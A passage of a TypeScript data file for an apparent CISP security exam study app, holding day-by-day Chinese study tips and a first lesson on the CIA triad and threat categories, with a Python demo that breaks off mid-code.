    { author: '陈明', title: '钓鱼邮件识别技巧', content: '识别钓鱼邮件要注意：发件人地址、邮件内容语法、附件类型、紧急语气。建议部署邮件安全网关，对可疑邮件进行沙箱检测。', url: '' },
  ],
  6: [
    { author: '林静', title: '密码学入门指南', content: '学习密码学从基础开始：对称加密、非对称加密、哈希函数。推荐用OpenSSL做实践练习，理解AES、RSA、SHA等算法的使用场景。不要自己实现加密算法！', url: '' },
    { author: '刘洋', title: '密钥管理最佳实践', content: '密钥是加密的核心。建议使用硬件安全模块（HSM）存储密钥，实施密钥轮换策略，定期审计密钥使用情况。避免硬编码密钥！', url: '' },
  ],
  7: [
    { author: '陈婷', title: '第一周学习总结', content: '第一周是基础中的基础，重点掌握CIA三要素和安全威胁分类。建议回顾本周内容，完成练习题检验学习效果。下周将学习法律法规知识，提前做好准备。', url: '' },
    { author: '张明', title: '学习方法建议', content: '信息安全学习需要理论与实践结合。每天保持2小时学习时间，多动手操作。建立知识体系思维导图，定期复习巩固。', url: '' },
  ],
  8: [
    { author: '赵强', title: '网络安全法解读', content: '《网络安全法》是我国网络安全领域的基本法，规定了网络运营者的安全义务、数据保护要求和法律责任。建议逐条研读，理解合规要点。', url: '' },
    { author: '孙丽', title: '数据安全法要点', content: '《数据安全法》强调数据分类分级保护，建立数据安全审查制度。企业需要制定数据安全管理制度，明确数据负责人职责。', url: '' },
  ],
  9: [
    { author: '周伟', title: '等保2.0实施指南', content: '等保2.0核心是"一个中心、三重防护"。实施步骤：定级备案→差距分析→安全建设→测评整改→持续监控。建议聘请专业机构进行合规咨询。', url: '' },
    { author: '吴刚', title: '等保测评准备', content: '测评前准备：整理制度文档、安全策略、运维记录、应急预案。重点关注技术层面：网络架构、访问控制、日志审计、数据保护。', url: '' },
  ],
  10: [
    { author: '郑敏', title: '个人信息保护法解读', content: '《个人信息保护法》赋予个人多项权利：知情权、决定权、删除权、可携带权。企业需要建立个人信息处理合规体系，开展隐私影响评估。', url: '' },
    { author: '黄磊', title: '数据脱敏实践', content: '数据脱敏是保护个人信息的重要手段。常用方法：加密、掩码、替换、删除。根据业务场景选择合适的脱敏方式，确保数据可用性和安全性平衡。', url: '' },
  ],
  11: [
    { author: '陈明', title: '关键信息基础设施保护', content: 'CII是国家安全的关键。运营者需要履行安全保护义务：制定专项保护计划、开展安全评估、建立监测预警体系。建议建立CII资产清单，实施重点保护。', url: '' },
    { author: '林静', title: '供应链安全', content: '供应链攻击日益增多，需要关注第三方组件安全。建议实施软件物料清单（SBOM）管理，定期对供应商进行安全评估。', url: '' },
  ],
  12: [
    { author: '刘洋', title: '网络安全审查要点', content: '网络安全审查关注影响国家安全的网络产品和服务。企业在采购关键设备时需要提前评估，必要时申报审查。建议建立供应商安全评估机制。', url: '' },
    { author: '陈婷', title: '数据出境合规', content: '数据出境需要满足法定条件：安全评估、标准合同、认证等。建议梳理数据流向，识别出境数据，制定合规方案。', url: '' },
  ],
  13: [
    { author: '张明', title: '合规管理体系建设', content: '合规管理需要建立完整体系：政策制度、组织架构、流程管控、技术保障、培训宣贯。建议参考ISO 27001建立信息安全管理体系。', url: '' },
    { author: '李华', title: '安全策略制定', content: '安全策略是安全管理的基石。策略应涵盖：访问控制、密码管理、数据分类、事件响应、应急预案。策略需要定期评审更新。', url: '' },
  ],
  14: [
    { author: '王静', title: '第二周学习总结', content: '法律法规是安全工作的底线。重点掌握等保2.0和数据合规要求。建议建立合规清单，对照检查自身差距。下周将学习访问控制技术。', url: '' },
    { author: '陈刚', title: '合规工具推荐', content: '推荐工具：等保合规检查工具、数据分类分级系统、隐私影响评估模板。利用自动化工具提高合规效率。', url: '' },
  ],
  15: [
    { author: '赵丽', title: '身份认证技术选型', content: '认证方式选择依据安全等级：普通系统用密码+MFA，高安全系统用硬件令牌或生物识别。建议实施密码策略，定期强制修改密码。', url: '' },
    { author: '孙强', title: '多因素认证部署', content: 'MFA是抵御密码泄露的有效手段。推荐使用TOTP（如Google Authenticator）或硬件密钥（如YubiKey）。注意备份恢复机制。', url: '' },
  ],
  16: [
    { author: '周芳', title: '密码安全最佳实践', content: '密码策略：长度至少12位、复杂度要求、定期更换、禁止重复使用。建议使用密码管理器，每个网站使用唯一密码。禁止使用生日、姓名等易猜测信息。', url: '' },
    { author: '吴涛', title: '密码破解防御', content: '防御密码破解：实施账户锁定策略、使用加盐哈希、限制登录尝试次数。建议使用bcrypt或Argon2等高成本哈希算法。', url: '' },
  ],
  17: [
    { author: '郑欣', title: '生物识别技术应用', content: '生物识别方便但有风险：指纹可被复制、面部识别可被欺骗。建议作为多因素认证的第二因素使用，不要单独作为唯一认证方式。', url: '' },
    { author: '黄磊', title: '行为生物识别', content: '行为生物识别是新兴技术：击键节奏、鼠标移动、步态等。可用于连续认证，提高安全性。注意隐私保护问题。', url: '' },
  ],
  18: [
    { author: '林静', title: '多因素认证设计', content: 'MFA组合策略：知识因素（密码）+持有因素（手机）+生物因素（指纹）。至少使用两种不同类型的因素。备份方案要安全可靠。', url: '' },
    { author: '徐鹏', title: '无密码认证趋势', content: '无密码认证是未来方向：FIDO2/WebAuthn协议支持硬件密钥认证。建议关注Passkey技术，逐步减少密码依赖。', url: '' },
  ],
  19: [
    { author: '马丽', title: 'SSO实施策略', content: 'SSO提升用户体验和安全性。选择方案：SAML 2.0适用于企业场景，OAuth 2.0适用于API场景，OpenID Connect适用于身份认证。注意安全配置，避免配置错误导致漏洞。', url: '' },
    { author: '刘伟', title: '身份提供商选择', content: '自建IDP适合大型企业，云IDP适合中小企业。推荐方案：Azure AD、Okta、Keycloak（开源）。关注集成能力和安全合规认证。', url: '' },
  ],
  20: [
    { author: '陈明', title: 'OAuth 2.0深度解析', content: 'OAuth 2.0不是认证协议，是授权协议。核心概念：授权码流程、令牌类型、作用域。注意授权码拦截攻击，使用PKCE增强安全性。', url: '' },
    { author: '杨雪', title: 'SAML与OAuth对比', content: 'SAML适合企业SSO，OAuth适合API授权。SAML基于XML，OAuth基于JSON。根据场景选择合适方案，不要混用。', url: '' },
  ],
  21: [
    { author: '赵云', title: '第三周学习总结', content: '访问控制是安全的核心。重点掌握认证技术和SSO实现。建议动手搭建一个简单的认证系统加深理解。下周将学习安全运营知识。', url: '' },
    { author: '孙燕', title: 'IAM体系建设', content: 'IAM涵盖身份管理、认证管理、授权管理。建议建立完整的IAM体系，实施权限生命周期管理。定期进行权限审计。', url: '' },
  ],
  22: [
    { author: '周杰', title: 'SOC建设指南', content: 'SOC建设需要技术和流程并重。建议分阶段实施：第一阶段建立监控能力，第二阶段建立检测响应能力，第三阶段实现自动化运营。', url: '' },
    { author: '吴敏', title: '安全运营成熟度', content: '从被动响应到主动防御需要时间。建议对照NIST CSF评估当前成熟度，制定改进路线图。工具不是万能的，流程更重要。', url: '' },
  ],
  23: [
    { author: '郑伟', title: '日志管理最佳实践', content: '日志是安全分析的基础。统一日志格式、确保时间同步、保留足够期限。建议使用ELK或Splunk建立集中日志平台。', url: '' },
    { author: '张伟', title: '日志分析技巧', content: '学习使用正则表达式和查询语言分析日志。建立关联分析能力，从海量日志中发现异常行为。关注失败登录、权限变更等关键事件。', url: '' },
  ],
  24: [
    { author: '李明', title: '安全监控体系', content: '监控覆盖网络、主机、应用、云环境。建立告警分级规则，避免告警疲劳。建议实施SOAR平台，实现自动化响应。', url: '' },
    { author: '王芳', title: '威胁情报整合', content: '威胁情报提高检测能力。订阅高质量情报源，整合到SIEM中。注意情报的时效性和准确性，定期评估情报质量。', url: '' },
  ],
  25: [
    { author: '赵强', title: '事件响应流程', content: '事件响应遵循PDCERF模型：准备→检测→抑制→根除→恢复→跟踪。建立清晰的角色职责，定期演练检验流程有效性。', url: '' },
    { author: '孙丽', title: 'SOC值班制度', content: '建立7x24小时值班机制，明确轮班安排和告警响应SLA。配备L1/L2/L3分析师团队，分级处理告警。', url: '' },
  ],
  26: [
    { author: '周伟', title: '应急响应预案', content: '预案需要覆盖常见场景：勒索软件、数据泄露、DDoS攻击、内部威胁。预案要可操作，定期演练更新。建立危机沟通机制。', url: '' },
    { author: '吴刚', title: '取证分析要点', content: '取证要遵循证据链原则。先收集易失性证据（内存），再收集非易失性证据（磁盘）。注意证据完整性，避免破坏原始数据。', url: '' },
  ],
  27: [
    { author: '郑敏', title: '灾难恢复规划', content: '备份策略遵循3-2-1原则：3份数据、2种介质、1份异地。定期测试恢复能力，确保RTO和RPO目标达成。建立异地灾备中心。', url: '' },
    { author: '黄磊', title: '业务连续性管理', content: 'BCM关注业务层面的连续性。识别关键业务流程，制定恢复优先级。定期进行业务影响分析（BIA）和演练。', url: '' },
  ],
  28: [
    { author: '陈明', title: '第四周学习总结', content: '安全运营是安全能力的体现。重点掌握日志管理和事件响应。建议参与一次应急演练，体验真实场景。下周将学习漏洞相关知识。', url: '' },
    { author: '林静', title: '安全运营工具链', content: '推荐工具：SIEM（Splunk/ELK）、EDR（CrowdStrike）、SOAR（Demisto）。根据预算和需求选择合适的解决方案。', url: '' },
  ],
  29: [
    { author: '刘洋', title: '漏洞管理流程', content: '漏洞管理生命周期：发现→评估→修复→验证→跟踪。建立漏洞优先级评估机制，根据CVSS评分和业务影响综合判断。', url: '' },
    { author: '陈婷', title: '漏洞数据库使用', content: '关注CVE、NVD、CNNVD等漏洞数据库。订阅漏洞告警，及时获取关键漏洞信息。建立内部漏洞知识库。', url: '' },
  ],
  30: [
    { author: '张明', title: '常见漏洞类型分析', content: 'OWASP Top 10是Web安全的重点：失效的访问控制、加密失效、注入攻击等。理解每种漏洞的原理和防护方法，结合靶场练习。', url: '' },
    { author: '李华', title: '漏洞挖掘技巧', content: '漏洞挖掘需要掌握：模糊测试、代码审计、逆向分析。从简单的靶场开始，逐步提高难度。遵守漏洞披露规范。', url: '' },
  ],
  31: [{
    author: '赵阳',
    title: '安全研究员',
    content: '第五周总结：漏洞与攻击域的核心是"理解漏洞、管理漏洞、防御漏洞"。CVSS 9.0+ = Critical、SQL注入用参数化查询、XSS 用输出编码+CSP、缓冲区溢出用DEP+ASLR+Canary 是四条硬核考点。'
  }],
  32: [{
    author: '陈静',
    title: '漏洞分析师',
    content: '对称加密核心考点：AES各工作模式对比。ECB不安全、GCM=AEAD双重价值。DES 56位、3DES 有效 112 位和 AES 128/256 位是考试数字考点。'
  }],
  33: [{
    author: '刘刚',
    title: '安全架构师',
    content: '非对称加密考试核心："签名用私钥、验签用公钥、加密用对端公钥"。ECC 256位≈RSA 3072位安全是经典题。DH是密钥交换协议而非加密算法。'
  }],
  34: [{
    author: '孙悦',
    title: '安全运营经理',
    content: '哈希函数核心考点：三大安全特性（抗碰撞=2^(n/2)是陷阱重点）、算法状态（MD5/SHA-1已死、SHA-256是标准）、密码存储（Argon2id是最佳实践）。哈希是单向不可逆的。'
  }],
  35: [{
    author: '周明',
    title: '安全顾问',
    content: '数字签名=私钥签+公钥验，必须刻进脑子的公式。PKI体系是数字签名的信任基础设施，CA是信任锚点。CRL（定期下载）和OCSP（实时查询）是维持PKI信任"新鲜度"的两只手。'
  }],
  36: [{
    author: '张伟',
    title: '密码学专家',
    content: '对称加密深度攻防实战：AES各模式的攻击面、填充预言攻击、侧信道攻击和国密SM4的实现安全。'
  }],
  37: [{
    author: '林芳',
    title: '加密技术顾问',
    content: '非对称加密攻击与防御：RSA/ECC的深度攻击面分析——唯密文攻击、选择密文攻击、时序攻击和密钥管理弱点。'
  }],
  38: [{
    author: '黄强',
    title: '密码学研究员',
    content: '哈希攻防实战：碰撞攻击实际案例、长度扩展攻击原理和HMAC的安全性分析。SHA-1已被实际碰撞破解，必须迁移到SHA-256。'
  }],
  39: [{
    author: '吴敏',
    title: 'PKI架构师',
    content: '数字签名与PKI部署实战：证书透明化(CT)、证书钉扎(Certificate Pinning)和PKI信任模型的深度解析。'
  }],
  40: [{
    author: '郑宇',
    title: '密码学讲师',
    content: 'PKI体系架构核心考点：CP/CPS的区别、密钥生命周期、HSM的作用、CT的背景——PKI不仅是技术还有管理维度。'
  }],
  41: [{
    author: '钱磊',
    title: '信息安全专家',
    content: 'TLS/SSL协议深度解析：TLS 1.3握手优化、常见攻击（降级攻击、中间人攻击）和服务器安全配置最佳实践。'
  }],
  42: [{
    author: '韩冰',
    title: '密码算法工程师',
    content: '第六周完成！密码学是信息安全的核心技术支撑。下周学习网络安全——防火墙、IDS/IPS、VPN和无线安全等关键网络防护技术。'
  }],
  43: [{
    author: '徐峰',
    title: '网络安全专家',
    content: '网络协议安全：TCP/IP协议栈安全分析与攻击防御——ARP欺骗、IP欺骗、ICMP攻击、DNS投毒和BGP劫持的原理与防御。'
  }],
  44: [{
    author: '何琳',
    title: '网络攻防讲师',
    content: '防火墙技术：包过滤、状态检测、应用代理和下一代防火墙的部署与安全策略配置。'
  }],
  45: [{
    author: '马超',
    title: '网络安全工程师',
    content: '入侵检测与防御：IDS vs IPS的本质区别、Snort规则编写、四种检测方法（签名/异常/协议/信誉）和部署策略。'
  }],
  46: [{
    author: '罗艳',
    title: '网络协议分析师',
    content: 'VPN技术：IPsec、SSL VPN和WireGuard的架构与安全性对比分析。'
  }],
  47: [{
    author: '孙鹏',
    title: '防火墙专家',
    content: '无线网络安全：WPA3、802.1X、Rogue AP和KARMA攻击的防御——Wi-Fi安全协议与攻击防护全解析。'
  }],
  48: [{
    author: '杨洁',
    title: '网络架构师',
    content: '网络分段与零信任：VLAN隔离、微分段和零信任网络架构的设计原则与实施。'
  }],
  49: [{
    author: '周斌',
    title: 'IDS/IPS工程师',
    content: '第七周完成！网络安全是CISP考试高频考点。下周学习应用安全——OWASP Top 10、SQL注入、XSS、CSRF等Web安全核心技术。'
  }],
  50: [{
    author: '赵云',
    title: '应用安全专家',
    content: 'Web安全基础：OWASP Top 10与HTTP安全机制——安全头配置、同源策略和现代Web安全基线。'
  }],
  51: [{
    author: '魏红',
    title: 'Web安全研究员',
    content: 'SQL注入进阶：盲注技术、二次注入、绕过WAF技巧和参数化查询的深层防御原理。'
  }],
  52: [{
    author: '蒋涛',
    title: '安全开发工程师',
    content: 'XSS进阶攻击与防御：DOM型XSS、mXSS、CSP策略设计和前端安全框架的最佳实践。'
  }],
  53: [{
    author: '沈琳',
    title: '应用安全顾问',
    content: 'CSRF防御体系：Token机制、SameSite Cookie、Referer验证和现代框架防护方案。'
  }],
  54: [{
    author: '韩磊',
    title: '代码审计专家',
    content: '文件上传攻击与防御：绕过技术、服务端检测、恶意文件识别和安全上传实现。'
  }],
  55: [{
    author: '朱敏',
    title: '安全测试工程师',
    content: '安全编码实践：安全开发生命周期与SAST——安全编码规范、静态分析工具和DevSecOps实践集成。'
  }],
  56: [{
    author: '秦刚',
    title: 'DevSecOps顾问',
    content: '第八周完成！应用安全是防御体系的最终防线。掌握OWASP Top 10和各项攻击防御技术，才能保护应用安全。下周学习物理安全。'
  }],
  57: [{
    author: '许阳',
    title: '物理安全专家',
    content: '物理安全基础：分层物理防护与安全区域——周边防护、建筑物安全和机房安全分层的设计原则。'
  }],
  58: [{
    author: '何芳',
    title: '数据中心架构师',
    content: '物理访问控制：门禁系统、生物识别——RFID、生物特征识别和多因素物理认证机制。'
  }],
  59: [{
    author: '吕强',
    title: '物理安全审计师',
    content: '环境安全：防火、防水、电力与环境控制——FM200气体灭火、精密空调和UPS供电系统的安全要求。'
  }],
  60: [{
    author: '施琳',
    title: '灾备规划师',
    content: '数据中心安全：Tier I-IV分级体系、冗余设计和TIA-942建设标准。'
  }],
  61: [{
    author: '张斌',
    title: 'PACS顾问',
    content: '容灾备份：3-2-1备份原则、RTO/RPO和灾难恢复测试方法。'
  }],
  62: [{
    author: '丁悦',
    title: '设施管理专家',
    content: '监控系统：CCTV部署、PIR传感器和水浸检测——视频监控、入侵报警与环境监控的安全集成。'
  }],
  63: [{
    author: '龚宇',
    title: '数据中心经理',
    content: '第九周物理安全体系回顾：分层防护原则、环境控制标准和数据中心运维安全。下周进入安全工程领域。'
  }],
  64: [{
    author: '余敏',
    title: '安全管理专家',
    content: '安全评估概述：风险评估方法论与实践——定量vs定性评估、SLE/ALE计算和风险处置策略。'
  }],
  65: [{
    author: '潘峰',
    title: '应急响应顾问',
    content: '威胁建模：STRIDE、攻击树与安全设计——威胁建模方法论、安全需求提取和架构风险分析。'
  }],
  66: [{
    author: '戴强',
    title: '安全审计师',
    content: '安全架构设计：纵深防御、最小权限、默认安全——安全架构原则、模式与实践。'
  }],
  67: [{
    author: '宋琳',
    title: '合规管理师',
    content: '安全开发生命周期(SDL)：需求阶段安全分析、威胁建模和SDL各阶段安全活动实践。'
  }],
  68: [{
    author: '卢刚',
    title: '风险管理专家',
    content: '代码审计：手动审查vs自动化SAST、常见漏洞模式和修复建议——安全代码审查方法论与实践。'
  }],
  69: [{
    author: '田静',
    title: '安全策略顾问',
    content: '安全测试与渗透测试：黑盒/白盒/灰盒测试、渗透测试流程和漏洞验证方法。'
  }],
  70: [{
    author: '贾明',
    title: 'BIA/BCP规划师',
    content: '第十周安全工程体系回顾与测验：风险评估、威胁建模、安全架构和SDL的综合检验。'
  }],
  71: [{
    author: '蔡琳',
    title: '隐私保护专家',
    content: '数据隐私法规与保护技术：PIPL核心要求、数据出境三种机制和PIA触发条件。'
  }],
  72: [{
    author: '谢涛',
    title: '数据治理顾问',
    content: '数据加密存储：五层加密模型、FDE/TDE/文件级加密和KMS密钥管理。'
  }],
  73: [{
    author: '曾敏',
    title: '合规审计师',
    content: '数据脱敏技术：静态脱敏(SDM)vs动态脱敏(DDM)、5种脱敏算法和FPE保留格式加密。'
  }],
  74: [{
    author: '袁强',
    title: '隐私法律顾问',
    content: '数据生命周期管理：数据分类分级、安全销毁方法和DLP三种部署模式。'
  }],
  75: [{
    author: '邓芳',
    title: 'DPO数据保护官',
    content: '隐私合规实践：有效同意五要素、DSAR标准流程和隐私合规审计核心检查项。'
  }],
  76: [{
    author: '萧磊',
    title: 'PIPL/CSL顾问',
    content: '数据治理体系：数据质量管理、元数据管理和数据血缘分析——企业数据治理框架与实践。'
  }],
  77: [{
    author: '尹静',
    title: '数据安全工程师',
    content: '第十一周最终冲刺！Day 78 开始模拟考试周——CISP全面模拟测试！77/84=92%，你已掌握CISP核心体系。'
  }],

78: [
    { author: '张明', title: 'CISP模拟考试一分析', content: '第一套模拟侧重基础记忆。重点关注CIA三要素、等保五级和关键数字。每道错题都回到原始章节重新理解,不要只看答案。', url: '' },
  ],
  79: [
    { author: '王静', title: '第二套模拟题特点', content: '第二套题侧重场景应用和综合分析,难度稍高。特别注意情境判断题,抓住题干关键约束条件。对比两套试卷全面发现薄弱点。', url: '' },
  ],
  80: [
    { author: '赵强', title: '易错点系统梳理', content: '最易混淆:BLP vs Biba(规则相反)、AH vs ESP(加密有无)、SAST vs DAST(静态/动态)、RTO vs RPO(时间/点)。建立对比表格反复记忆。', url: '' },
  ],
  81: [
    { author: '周伟', title: '知识体系串联方法', content: '将11个知识域画成思维导图,用线连接关联概念。CIA→密码学→访问控制→网络安全→数据安全,形成完整链条。理解关系比死记更重要。', url: '' },
  ],
  82: [
    { author: '郑敏', title: '冲刺阶段策略', content: '考前冲刺:①过口诀(30条每天一遍);②看错题(只看错题本,不做新题);③保持手感(每天10-20道随机题)。不过度学习,保持状态。', url: '' },
  ],
  83: [
    { author: '陈明', title: 'CISP考场实战经验', content: '实际考试:①先花2分钟快速浏览试卷;②严格按三阶段时间管理;③不会的题标记跳过;④特别注意\'不属于/错误/除了\'等否定词。', url: '' },
  ],
  84: [
    { author: '张伟', title: '84天学习回顾', content: '恭喜完成84天CISP备考!从CIA三要素到PICERL应急响应,从BLP到零信任,你已掌握CISP核心体系。剩下的就是从容赴考。CISP只是安全生涯起点。', url: '' },
  ],
  85: [
    { author: 'CISP导师', title: '信息安全基础与法律法规专项复习', content: '重点回顾CIA三要素、等保制度、网络安全法等基础考点。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  86: [
    { author: 'CISP导师', title: '密码学与访问控制专项复习', content: 'BLP/Biba对比、AES/RSA/ECC参数、Kerberos/OAuth/SAML认证协议对比。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  87: [
    { author: 'CISP导师', title: '网络安全与应急响应专项复习', content: 'PICERL六步法、RTO/RPO区分、TLS1.3改进、IDS/IPS差异、BCP/DRP关系。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  88: [
    { author: 'CISP导师', title: '应用安全与攻防技术专项复习', content: 'OWASP Top10 2021、SQLi/XSS/CSRF/SSRF防御、SAST/DAST区分、STRIDE威胁建模。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  89: [
    { author: 'CISP导师', title: '风险管理与数据安全专项复习', content: 'SLE=AV×EF/ALE公式、风险处置四策略、数据脱敏SDM/DDM、3-2-1备份规则。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  90: [
    { author: 'CISP导师', title: '考前最后总复习与心态调整', content: '回顾全部30条冲刺口诀、确认考试物品和策略、调整最佳考试心态。60分万岁!。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],};

// Complete learning content for all 90 days
const allDays: LearningDay[] = [
  // ========== Week 1: 信息安全基础 ==========
  {
    id: 'day-1', day: 1, week: 1, title: '信息安全的定义',
    objectives: ['理解信息安全概念', '掌握CIA三要素', '了解安全威胁分类'],
    content: '# 信息安全概述\n\n> 📋 **本节大纲**　一、什么是信息安全 · 二、CIA三要素详解（机密性/完整性/可用性，含破坏案例+5项防护措施） · 三、CIA要素的制约关系 · 四、威胁分类（按来源/按行为/五大常见威胁详解） · 五、\n## 🔴 高频考点\n\n· CIA三要素是所有CISP考题的基础框架，必须能默写三个英文全称\n· 内部威胁vs外部威胁的本质区别：**前者拥有合法访问权限**，这是最高频的判断题陷阱\n· 被动攻击（窃听/不留下痕迹）vs主动攻击（篡改/会留日志）的检测难度对比，考试常考\n## 💜 记忆口诀\n\n· **CIA三要素**：C=看不到(Confidentiality)、I=改不了(Integrity)、A=用得了(Availability)\n· **内部威胁**："权限是工作需要，也是威胁来源"\n· **被动vs主动**："被动悄悄看(窃听/难检测)、主动动手改(篡改/留痕迹)"\n学习建议与考点速记\n\n## 什么是信息安全？\n\n信息安全（Information Security）是指保护信息及信息系统免受未经授权的访问、使用、披露、破坏、修改或销毁，确保信息在产生、传输、存储、处理、销毁全生命周期中的安全。\n\n信息安全的保护对象不仅仅是"数据"，还包括：\n- **硬件**：服务器、网络设备、存储设备\n- **软件**：操作系统、应用程序、数据库\n- **数据**：数据库记录、文件、通信内容\n- **人员**：员工、客户、合作伙伴的信息\n- **流程**：业务流程、操作规程\n\n信息安全的终极目标是保障组织业务在面临威胁时能够持续运行，保护组织的核心资产（数据、声誉、客户信任）不受损害。\n\n## CIA三要素（信息安全铁三角）\n\nCIA三要素是信息安全最基础的理论框架，所有安全控制措施都是围绕这三个目标设计的。CISP考试必考，请务必深入理解每一个要素的含义和对应的防护措施。\n\n### 一、机密性（Confidentiality）\n\n**定义：**确保信息仅能被授权的个人、实体或进程访问，防止未授权的信息泄露。\n\n**通俗理解：**不该看的人看不到。就像你的银行账户余额，只有你和银行有权查看，其他人不应知道。\n\n**机密性被破坏的典型案例：**\n- 某公司客户数据库被黑客拖库，数百万用户信息泄露\n- 员工将内部文件通过个人邮箱发送给竞争对手\n- 公共场所讨论涉密项目被他人听到\n\n**实现机密性的主要技术措施：**\n1. **数据加密**：AES-256加密静态数据，TLS 1.3加密传输数据\n2. **访问控制**：基于角色的权限管理（RBAC），确保只有授权人员能读取\n3. **身份认证**：多因素认证（MFA）验证访问者身份\n4. **数据分类分级**：将数据按敏感程度分级，对不同级别施加不同保护\n5. **物理安全**：门禁系统、访客管理，防止未授权人员接近设备\n\n### 二、完整性（Integrity）\n\n**定义：**确保信息在存储和传输过程中不被未授权地修改或破坏，保证信息的准确性和一致性。\n\n**通俗理解：**信息不能被偷偷改掉。就像你的银行转账记录，不能被人从100元改成10000元，也不能丢失任何一条记录。\n\n**完整性被破坏的典型案例：**\n- 中间人攻击篡改在线交易的收款账户信息\n- 数据库管理员私自修改自己的工资记录\n- 恶意软件在文件传输中植入后门代码\n- 存储介质故障导致数据部分损坏\n\n**实现完整性的主要技术措施：**\n1. **哈希校验**：SHA-256计算文件摘要，传输前后比对确保未被修改\n2. **数字签名**：用私钥对数据签名，公钥验证签名确认来源和完整性\n3. **版本控制**：Git/SVN记录每次修改，可追溯、可回滚\n4. **访问控制 + 审计日志**：限制谁能修改数据，记录谁改了什么\n5. **RAID/冗余存储**：防止硬件故障导致的数据损坏\n\n### 三、可用性（Availability）\n\n**定义：**确保授权用户在需要时能够及时、可靠地访问信息和信息系统。\n\n**通俗理解：**要用的时候能用。银行APP在你想转账的时候必须能打开，不能动不动就"系统维护中"。\n\n**可用性被破坏的典型案例：**\n- DDoS攻击导致网站无法访问（如某电商双11期间被攻击宕机）\n- 服务器硬件故障导致业务中断数小时\n- 勒索软件加密了所有文件导致业务瘫痪\n- 数据中心断电/火灾导致全站服务不可用\n\n**实现可用性的主要技术措施：**\n1. **冗余备份**：双机热备、数据库主从同步，一台故障另一台接管\n2. **负载均衡**：多台服务器分担流量，单台过载不影响整体服务\n3. **容灾恢复**：异地多活数据中心，灾难时可快速切换\n4. **DDoS防护**：流量清洗、CDN分发、黑洞路由\n5. **UPS不间断电源**：防止断电导致服务器宕机\n\n### CIA三要素的关系\n\nCIA三者相互关联、相互制约。过度强化一项可能削弱另一项：\n- 过度加机密性（如严格加密）可能降低可用性（解密耗时）\n- 过度强化可用性（如开放更多访问）可能损害机密性\n- 安全设计的核心是找到三者之间的最佳平衡点\n\n**CISP考试记忆技巧：C=看不到、I=改不了、A=用得了**\n\n## 信息安全威胁分类\n\n了解威胁是防御的前提。信息安全威胁可以从多个维度分类：\n\n### 按威胁来源分类\n\n**内部威胁（Insider Threat）：**\n- 来源：组织内部的员工、承包商、合作伙伴\n- 无意威胁：员工误操作删除数据、误点钓鱼邮件、丢失存有敏感数据的U盘\n- 恶意威胁：离职员工报复性删除数据、内部人员窃取商业机密卖钱\n- 特点：拥有合法访问权限，最难防范——权限是工作需要，也是威胁源头\n- 防御：最小权限原则、职责分离、离职即时回收权限、DLP数据防泄漏\n\n**外部威胁（External Threat）：**\n- 来源：黑客组织、网络犯罪分子、竞争对手、国家级APT组织\n- 方式：漏洞利用、钓鱼攻击、DDoS攻击、供应链攻击\n- 特点：没有合法权限，需要先"攻入"系统\n- 防御：防火墙、IDS/IPS、WAF、漏洞管理、渗透测试\n\n### 按威胁行为分类\n\n**被动威胁（Passive Attack）：**\n- 攻击者仅监听和收集信息，不修改系统\n- 典型手法：流量嗅探、窃听通信、流量分析（分析通信模式推断信息）\n- 特点：难以检测——攻击者不留下痕迹\n- 防御：数据加密（即使被窃听也无法解密）\n\n**主动威胁（Active Attack）：**\n- 攻击者主动修改系统或数据\n- 典型手法：篡改数据、拒绝服务攻击、重放攻击、伪造身份\n- 特点：更容易检测——攻击行为会产生日志和异常\n- 防御：入侵检测（IDS）、完整性校验、访问控制\n\n### 常见威胁类型详解\n\n**1. 恶意软件（Malware）：**\n- 病毒（Virus）：需要宿主程序，用户执行感染文件时触发\n- 蠕虫（Worm）：独立传播，不需要用户交互，通过网络自动扩散\n- 木马（Trojan）：伪装成正常软件诱骗用户安装，暗中执行恶意操作\n- 勒索软件（Ransomware）：加密用户文件索取赎金\n\n**2. 网络钓鱼（Phishing）：**\n- 伪造看似合法的邮件/网站，诱骗用户输入密码、信用卡信息\n- 鱼叉式钓鱼（Spear Phishing）：针对特定个人/组织的定制化钓鱼\n\n**3. 中间人攻击（MITM）：**\n- 攻击者插入通信双方之间，拦截和可能篡改通信内容\n- 典型：公共WiFi下的ARP欺骗、伪造证书的SSL中间人\n\n**4. SQL注入（SQL Injection）：**\n- 在Web表单输入恶意SQL代码，操纵后端数据库\n- 可导致数据泄露、数据篡改甚至服务器被控制\n\n**5. 零日漏洞（Zero-Day）：**\n- 已被发现但厂商尚未发布补丁的漏洞\n- 攻击窗口期内防御方完全无招架之力\n- 危害性极高，常被APT组织用于精准攻击\n\n## 学习建议\n\n- CIA三要素是CISP考试最基础的考点，必须能默写\n- 每个CIA要素要能举出一个破坏案例和一个防护措施\n- 区分内部威胁和外部威胁的本质：前者有合法权限\n- 理解被动威胁（窃听）和主动威胁（篡改）的检测难度差异',
    codeExample: { language: 'python', code: '# 信息安全CIA三要素详细演示\nclass InfoSec_CIA:\n    """演示CIA三要素及其实现方式"""\n    \n    def demonstrate_confidentiality(self, data):\n        """机密性：加密示例"""\n        import base64\n        # 简单的Base64编码演示（实际应用应使用AES-256）\n        encoded = base64.b64encode(data.encode()).decode()\n        decoded = base64.b64decode(encoded).decode()\n        print(f"原始数据: {data}")\n        print(f"加密后(仅授权方可解密): {encoded[:20]}...")\n        print(f"授权解密后: {decoded}")\n        return data == decoded\n    \n    def demonstrate_integrity(self, data):\n        """完整性：哈希校验示例"""\n        import hashlib\n        hash_before = hashlib.sha256(data.encode()).hexdigest()\n        print(f"原始数据: {data}")\n        print(f"SHA-256哈希值: {hash_before[:16]}...")\n        # 验证：重新计算哈希并比对\n        hash_after = hashlib.sha256(data.encode()).hexdigest()\n        if hash_before == hash_after:\n            